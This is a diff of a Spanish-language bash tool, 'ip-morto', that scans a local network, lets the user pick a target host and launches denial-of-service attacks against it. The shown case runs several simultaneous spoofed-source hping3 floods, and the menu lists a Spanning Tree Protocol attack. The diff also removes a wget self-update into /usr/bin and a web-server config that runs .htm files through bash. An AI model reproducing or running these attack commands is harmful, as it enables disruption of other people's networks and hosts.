@@ -53,25 +53,29 @@ echo -e "\e[0;31m
                                                                  
 "
 echo 
-echo -e "\e[0;31m 			version 2.0"
+echo -e "\e[0;31m 			version \e[0;37m 2.0"
 echo
-echo -e "\e[0;31m         por aka-kuro para seguridad wireless"
+echo -e "\e[0;31m            Por aka-kuro para seguridad wireless"
 echo
 echo
 tput sgr0
 sleep 0.5
 
 }
+
 root(){
+	
 if ! [ $(id -u) = 0 ]; then 
 	echo "El script necesita acceso root" 
 exit 1 
 fi
 
 }
+
 Conexion(){
+	
 if ping -c1 google.com &>/dev/null ; then
-	echo -en "\e[0;37m Ejecutando script, tienes conexion a internet"
+	echo -en "\e[0;37m Estas conectado a internet, ejecutando script"
 	echo 
 	echo
 else
@@ -80,22 +84,7 @@ else
 fi
 
 }
-Actualizazion(){
-echo -en  "\e[0;37m Descargando actualizazion del script"
-echo 
-echo
-update=$( wget https://raw.githubusercontent.com/aka-kuro/script/master/ip-morto -O /tmp/ip-morto/ip-morto 2>/dev/null  )
-if $update ; then
-	mv /tmp/ip-morto/ip-morto /usr/bin/ 2>/dev/null
-	chmod +x /usr/bin/ip-morto 2>/dev/null
-	echo -en  "\e[0;37m Actualizacion completada"
-	echo 
-else
-	echo -en "\e[0;37m Error al descargar archivo"
-	echo
-fi
 
-}
 Comprobacion(){
 echo -en "\e[0;37m Programas"
 echo 
@@ -145,11 +134,68 @@ else
 fi
 sleep 0.2
 
+echo
+echo -en "\e[0;37m Herramientas"
+echo 
+
+echo -en "\e[0;32m grep........."
+if ! hash grep 2>/dev/null ; then
+	echo -e "\e[0;37m No esta instalado"
+	exit 0
+else
+	echo -e "\e[0;37m Esta instalado"
+fi
+sleep 0.2
+
+echo -en "\e[0;32m cut.........."
+if ! hash cut 2>/dev/null ; then
+	echo -e "\e[0;37m No esta instalado"
+	exit 0
+else
+	echo -e "\e[0;37m Esta instalado"
+fi
+sleep 0.2
+
+echo -en "\e[0;32m sed.........."
+if ! hash sed 2>/dev/null ; then
+	echo -e "\e[0;37m No esta instalado"
+	exit 0
+else
+	echo -e "\e[0;37m Esta instalado"
+fi
+sleep 0.2
+
+echo -en "\e[0;32m lspci........"
+if ! hash lspci 2>/dev/null ; then
+	echo -e "\e[0;37m No esta instalado"
+	exit 0
+else
+	echo -e "\e[0;37m Esta instalado"
+fi
+sleep 0.2
+
+echo -en "\e[0;32m lsusb........"
+if ! hash lsusb 2>/dev/null ; then
+	echo -e "\e[0;37m No esta instalado"
+	exit 0
+else
+	echo -e "\e[0;37m Esta instalado"
+fi
+sleep 0.2
+
+echo -en "\e[0;32m awk.........."
+if ! hash awk  2>/dev/null ; then
+	echo -e "\e[0;37m No esta instalado"
+	exit 0
+else
+	echo -e "\e[0;37m Esta instalado"
+fi
+sleep 0.2
 
 echo
 echo -en "\e[0;37m Escriba .exit para salir del programa"
 echo 
-echo -en "\e[0;32m Presione enter para continuar\e[0;37m  " && read enter
+echo -en "\e[0;32m Presione cualquier tecla para continuar\e[0;37m  " && read enter
 
 case $enter in
 	.exit) echo; echo -e "\e[0;37m Saliendo del programa"; rm -R /tmp/ip-morto 2>/dev/null; sleep 03; clear; exit 0;;
@@ -225,8 +271,11 @@ rm -rf /tmp/ip-morto/objetivos 2>/dev/null
 
 clear
 Titulo
+
 echo -en "\e[0;37m Si desa repetir la busqueda escriba .repit"
 echo
+echo
+
 obj=$( column -t /tmp/ip-morto/objetivo > /tmp/ip-morto/objetivos )
 
 if [ -s /tmp/ip-morto/objetivos ]; then
@@ -249,7 +298,7 @@ echo -en "\e[0;32m Seleccione el objetivo a atacar\e[0;31m =>\e[0;37m " && read 
 sel=$( cat -n /tmp/ip-morto/objetivos | cut -f1 | paste -sd"|" |  sed 's/ //g' )
 
 case $objetivo in
-	[$sel]) obje=$( head -$objetivo /tmp/ip-morto/objetivos | tail -1 | awk '{ print $1 }' ); echo; echo " A seleccionado $obje"; sleep 02; clear; Titulo; Servidor;;
+	[$sel]) obje=$( head -$objetivo /tmp/ip-morto/objetivos | tail -1 | awk '{ print $1 }' ); echo; echo " A seleccionado $obje"; sleep 02; clear; Titulo; Ataque;;
 	.exit) echo; echo " Saliendo del programa"; rm -R /tmp/ip-morto 2>/dev/null; sleep 03; clear; exit 0;;
 	.repit) clear; Titulo; Busqueda;;
 	*) echo; echo  " Ingrese un formato válido! Sólo los números que salen listados!"; sleep 03; clear; Titulo; Objetivos;;
@@ -257,32 +306,7 @@ esac
 
 }
 
-config(){
-
-mkdir /tmp/ip-morto/www
-
-	{
-	echo -e "server.document-root = \"/tmp/ip-morto/www"
-	echo -e "server.modules = ("
-	echo -e "\"mod_cgi\""
-	echo -e ")\n"
-	echo -e "server.port = 80\n"
-	echo -e "index-file.names = ( \"${indexfile}\" )\n"
-	echo -e "server.error-handler-404 = \"/\"\n"
-	echo -e "mimetype.assign = ("
-	echo -e "\".css\" => \"text/css\","
-	echo -e "\".js\" => \"text/javascript\""
-	echo -e ")\n"
-	echo -e "cgi.assign = ( \".htm\" => \"/bin/bash\" )"
-	} >> "/tmp/ip-morto/www/lighttpd.cfg"
-}
-
 Ataque(){
-
-IP=$( head -$objetivo /tmp/ip-morto/objetivos | tail -1 | awk '{ print $1 }' 2>/dev/null )
-Gate=$( ip route show | grep default | awk {'print $3'} 2>/dev/null  )
-INTER=$( head -$interfaz /tmp/ip-morto/Interfaz | tail -1 2>/dev/null  )
-MAC=$( head -$objetivo /tmp/ip-morto/objetivos | tail -1 | awk '{ print $2 }' 2>/dev/null  )
 
 echo -en " \e[0;31m1) \e[0;37m Hping3"
 echo
@@ -294,6 +318,11 @@ echo -en " \e[0;31m4) \e[0;37m Spanning Tree Protocol (efectivo)"
 echo
 echo
 echo -en "\e[0;32m Seleccione el metodo de ataque\e[0;31m =>\e[0;37m " && read ataque
+
+IP=$(head -$objetivo /tmp/ip-morto/objetivos | tail -1 | awk '{ print $1 }' 2> /dev/null) 
+Gate=$(ip route show | grep default | awk {'print $3'} 2> /dev/null)
+INTER=$(head -$interfaz /tmp/ip-morto/Interfaz | tail -1 2> /dev/null )
+MAC=$(head -$objetivo /tmp/ip-morto/objetivos | tail -1 | awk '{ print $2 }' 2> /dev/null )
 
 case $ataque in
 	1) hping3 --flood --rand-source $IP & sleep 02 & hping3 --flood --rand-source $IP & sleep 02 & hping3 --flood --rand-source $IP & sleep 02 & hping3 --flood --rand-source $IP; sleep 03; clear; Titulo; Ataque;;
@@ -309,7 +338,6 @@ esac
 Titulo
 root
 Conexion
-Actualizazion
 Comprobacion
 Interfaz
 
